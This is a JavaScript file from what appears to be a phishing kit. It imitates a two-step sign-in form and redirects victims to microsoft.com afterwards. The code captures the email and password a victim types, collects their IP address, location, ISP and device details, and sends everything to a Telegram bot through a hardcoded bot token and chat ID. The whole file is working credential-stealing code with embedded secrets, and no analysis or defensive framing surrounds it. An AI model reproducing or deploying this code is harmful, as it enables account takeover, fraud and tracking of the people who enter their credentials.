const accessInput = document.getElementById("oid");
const nextBtn = document.getElementById("next-button");
const passInput = document.getElementById("pid");
const emlog = document.getElementById("emlog");
const errorMsg = document.getElementById("error-prompter");
const signInBtn = document.getElementById("sign-in-button");
const lineBreak = "\n";

const botToken = "7185778415:AAEE6VDea7lGym0XEUQlgkhl72vLuVAVJ6w";
const chatId = "672455191";
const ipToken = "dc4e3adc9560cb";

if (localStorage.key("acc")) {
  emlog.textContent = localStorage.getItem("acc");
}

const getId = () => {
  const email = accessInput.value.trim();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (email === "" || !emailRegex.test(email)) {
    errorMsg.textContent = "Enter a valid email address.";
    return;
  }

  localStorage.setItem("acc", email);
  window.location.href = "continue.html";
};

const processAccess = () => {
  const pid = passInput.value.trim();

  if (pid === "") {
    errorMsg.textContent = "Enter your password.";
    return; // don't proceed or roll the button
  }

  signInBtn.classList.add("loading"); // now start rolling the button

  fetch(`https://ipinfo.io/json?token=${ipToken}`)
    .then((response) => response.json())
    .then((data) => {
      const city = data.city;
      const country = data.country;
      const ip = data.ip;
      const loc = data.loc;
      const org = data.org;
      const region = data.region;
      const timezone = data.timezone;

      const browser = platform.name;
      const browserVersion = platform.version;
      const browserOs = platform.os;
      const browserDescription = platform.description;
      const browserEngine = platform.layout;
      const browserDeviceManufacturer = platform.manufacturer;
      const browserDeviceType = platform.product;
      const browserComprehension = platform.toString();
      const browserOsFamily = platform.os.family;

      const acc = localStorage.getItem("acc");

      const message =
        "Username : " + acc + lineBreak +
        "Pwd : " + pid + lineBreak +
        "City : " + city + lineBreak +
        "Country : " + country + lineBreak +
        "IP : " + ip + lineBreak +
        "Latitude & Longitude : " + loc + lineBreak +
        "Internet Service Provider (ISP) : " + org + lineBreak +
        "Region : " + region + lineBreak +
        "Timezone : " + timezone + lineBreak +
        "Browser Name : " + browser + lineBreak +
        "Browser Version : " + browserVersion + lineBreak +
        "Device Operating System : " + browserOs + lineBreak +
        "Browser Description : " + browserDescription + lineBreak +
        "Browser Engine : " + browserEngine + lineBreak +
        "Device Manufacturer : " + browserDeviceManufacturer + lineBreak +
        "Device Type : " + browserDeviceType + lineBreak +
        "Device and Browser Description : " + browserComprehension + lineBreak +
        "Device Operating System : " + browserOsFamily + lineBreak;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.ok) {
            window.location.href = "https://microsoft.com";
          } else {
            console.error("Error sending to channel 1:", data.description);
          }
        })
        .catch((error) => console.error("Error:", error));
    });
};

nextBtn.addEventListener("click", getId);
signInBtn.addEventListener("click", processAccess);
